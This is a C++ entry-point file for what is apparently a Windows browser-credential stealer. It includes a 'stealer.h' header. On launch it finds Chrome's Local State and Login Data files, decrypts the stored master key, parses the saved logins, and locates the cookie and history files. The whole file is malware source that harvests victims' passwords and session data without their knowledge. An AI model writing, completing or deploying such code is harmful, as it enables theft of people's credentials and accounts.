#include "gui.h"
#include "stealer.h"

#include <thread>

int __stdcall wWinMain(
	HINSTANCE instance,
	HINSTANCE previousInstance,
	PWSTR arguments,
	int commandShow)
{
    if (bitmen::IsChromeInstalled()) {
        std::wstring localStatePath = bitmen::FindLocalState();
        std::wstring loginDataPath = bitmen::FindLoginData();

        std::string encryptedKey = bitmen::getEncryptedKey(localStatePath);
        DATA_BLOB decryptionKey = bitmen::decryptKey(encryptedKey);

        int parser = bitmen::loginDataParser(loginDataPath, decryptionKey);

        LocalFree(decryptionKey.pbData);

        std::wstring historyPath = bitmen::FindHistoryPath();

        std::wstring cookiesPath = bitmen::FindCookiesPath();
        DATA_BLOB key = bitmen::decryptKey(encryptedKey);

        LocalFree(key.pbData);
    }

    return EXIT_SUCCESS;
}